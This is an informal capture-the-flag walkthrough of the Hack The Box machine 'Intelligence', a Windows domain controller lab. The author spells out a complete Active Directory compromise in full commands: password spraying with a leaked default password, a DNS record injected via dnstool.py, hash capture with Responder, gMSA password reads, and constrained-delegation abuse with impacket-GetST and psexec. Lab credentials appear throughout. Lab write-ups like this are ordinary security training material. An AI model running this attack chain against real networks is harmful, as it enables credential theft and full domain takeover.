Started with a nmap scan
```
53 DNS
80 IIS 10.0
88 Kerberos
135
139
389 LDAP
445
636
3268
3269
```
Domain `intelligence.htb` Hostname `DC` 
Looking at the website there is a `/documents` folder with some PDF files in it all have a common naming schema we can download them and use exiftool to get possible usernames and we find one file `2020-06-04-upload.pdf` has a password in it and running this password aginst all the users names we got we found one account with the defult creds `Tiffany.molina:NewIntelligenceCorpUsers9876` and this has access to some SMB shares `IT,Users` in the `IT` share there is a ps1 script to check the webserver aginst downdetector now we check out the USERS share we found the user flag now going back to that script we can add are ip to the dns with `dnstool.py` and then get a hash back `python dnstool.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUsers9876' --action add --record 'web-exploit' -d 10.10.16.4 10.10.10.248` and then we can run responder and we wait 5 mins and we get a hash back `sudo responder -I tun0` and we can use hashcat to crack the hash and we got the creds to the ted user `ted.graves:Mr.Teddy` now we can get are bloodhound data with rusthound and looking at it  ted has writes over the `svc_int$` user to read gmsa passwords and we can use netexec to get this easily `nxc ldap 10.10.10.248 -u TED.Graves -p 'Mr.Teddy' --gmsa` and this `svc_int$` can `ALLowedToDelegate` we can use the impacket-Getst script `impacket-GetST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -altservice 'cifs' -hashes :hash 'intelligence.htb/svc_int$'` now we got are ticket we need to auth  `KRB5CCNAME=ticket.ccname impacket-psexec 'intelligence/administrator@dc.intelligence.htb' -k -no-pass` and now we are admin user 